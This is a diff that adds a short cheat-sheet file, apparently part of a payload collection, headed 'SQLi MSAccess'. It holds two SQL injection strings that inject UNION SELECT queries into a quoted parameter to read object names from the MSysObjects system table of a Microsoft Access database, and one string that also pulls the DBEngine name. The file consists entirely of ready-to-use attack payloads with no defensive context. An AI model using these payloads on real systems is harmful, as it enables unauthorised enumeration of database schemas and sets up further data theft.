@@ -1,0 +1,8 @@
+==============================================================================
+[+] SQLi MSAccess
+==============================================================================
+
+1' UNION SELECT Name, NULL,  NULL,NULL, NULL, NULL, NULL, NULL,NULL, NULL from MSysObjects
+# Rename Database
+
+1' UNION SELECT Name, DBEngine.Name,  NULL,NULL, NULL, NULL, NULL, NULL,NULL, NULL from MSysObjects
